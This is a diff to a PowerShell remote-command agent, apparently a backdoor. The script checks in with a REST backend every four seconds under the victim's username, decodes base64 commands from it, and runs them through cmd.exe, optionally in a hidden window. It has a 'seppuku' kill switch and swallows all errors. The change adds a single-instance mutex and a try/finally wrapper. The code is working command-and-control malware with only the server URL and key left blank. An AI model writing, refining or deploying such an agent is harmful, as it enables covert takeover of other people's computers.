@@ -1,3 +1,6 @@
+$mutex = New-Object System.Threading.Mutex($false, "run_mutex")
+if (-not $mutex.WaitOne(0)) { exit }
+
 $BASE_URL = ""
 $API_KEY = ""
 
@@ -9,23 +12,28 @@ $h = @{
     "Accept"        = "application/vnd.pgrst.object+json"
 }
 
-while ($true) {
-    try {
-        # heartbeat
-        $u = "$BASE_URL/clients?username=eq.$env:USERNAME&select=cmd,run,visible"
-        $r = Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"updated_at": "now()"}'
+try {
+    while ($true) {
+        try {
+            # heartbeat
+            $u = "$BASE_URL/clients?username=eq.$env:USERNAME&select=cmd,run,visible"
+            $r = Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"updated_at": "now()"}'
         
-        # run command
-        if ($r.run -eq $true) {
-            Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"cmd": null, "run": false}' | Out-Null
+            # run command
+            if ($r.run -eq $true) {
+                Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"cmd": null, "run": false}' | Out-Null
 
-            $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd))
-            if ($c -eq "seppuku") { exit }
+                $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd))
+                if ($c -eq "seppuku") { exit }
 
-            $style = if ($r.visible -eq $true) { "Normal" } else { "Hidden" }
-            Start-Process cmd.exe -ArgumentList "/c", $c -WindowStyle $style
+                $style = if ($r.visible -eq $true) { "Normal" } else { "Hidden" }
+                Start-Process cmd.exe -ArgumentList "/c", $c -WindowStyle $style
+            }
         }
+        catch {}
+        Start-Sleep -Seconds 4
     }
-    catch {}
-    Start-Sleep -Seconds 4
+}
+finally {
+    $mutex.ReleaseMutex()
 }
